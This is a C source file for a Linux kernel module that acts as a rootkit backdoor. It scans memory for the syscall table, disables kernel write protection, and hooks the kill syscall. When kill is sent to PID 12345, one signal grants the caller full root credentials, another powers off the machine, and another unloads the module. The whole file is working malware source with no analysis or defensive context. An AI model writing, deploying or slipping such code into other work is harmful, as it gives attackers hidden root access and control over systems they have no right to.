#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/reboot.h>

MODULE_LICENSE("GPL");

#define SIG_SHUTDOWN 58
#define SIG_ROOT 59
#define SIG_UNLOAD 60

#define PID 12345

typedef asmlinkage int (*orig_kill_t)(pid_t, int);
static unsigned long *__syscall_table;
orig_kill_t orig_kill;


unsigned long *find_syscall_table(void)
{
	unsigned long *syscall_table;
	unsigned long int i;

	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
			i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
}

void give_root(void) {
	struct cred *newcreds;
	newcreds = prepare_creds();
	if (newcreds == NULL)
		return;

	newcreds->uid.val = newcreds->gid.val = 0;
	newcreds->euid.val = newcreds->egid.val = 0;
	newcreds->suid.val = newcreds->sgid.val = 0;
	newcreds->fsuid.val = newcreds->fsgid.val = 0;
	commit_creds(newcreds);
}

void unload(char* modname) {
	char *argv[] = {"/sbin/rmmod", modname, NULL};
	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
}

asmlinkage int hacked_kill(pid_t pid, int sig) {
	int tpid = PID, ret_tmp;

	if ((tpid == pid)) {
		switch (sig) {
			case SIG_SHUTDOWN:
				printk(KERN_INFO "LKM: Received shutdown signal.");
				kernel_power_off();
				break;
			
			case SIG_ROOT:
				printk(KERN_INFO "LKM: Received root signal.");
				give_root();
				break;

			case SIG_UNLOAD:
				printk(KERN_INFO "LKM: Received unload signal.");
				unload(THIS_MODULE->name);
				break;

			default:
				printk(KERN_INFO "LKM: Received invalid signal %d.", sig);
				break;
		}

		return 0;
	} else {
		ret_tmp = orig_kill(pid, sig);
		return (ret_tmp);
	}
}

static int __init startup(void) {	
	__syscall_table = find_syscall_table();
	if (!__syscall_table) {
		printk(KERN_INFO "LKM: Syscall table not found");
		return -1;
	}

	write_cr0(read_cr0() & (~ 0x10000));
	
	orig_kill = (orig_kill_t) __syscall_table[__NR_kill];
	__syscall_table[__NR_kill] = (unsigned long) hacked_kill;
	write_cr0(read_cr0() | 0x10000);

	printk(KERN_INFO "LKM: Module loaded as %s!", THIS_MODULE->name);

	return 0;
}

static void __exit cleanup(void) {
	write_cr0(read_cr0() & (~ 0x10000));
	__syscall_table[__NR_kill] = (unsigned long) orig_kill;
	write_cr0(read_cr0() | 0x10000);

	printk(KERN_INFO "LKM: Module unloaded!");
}

module_init(startup);
module_exit(cleanup);
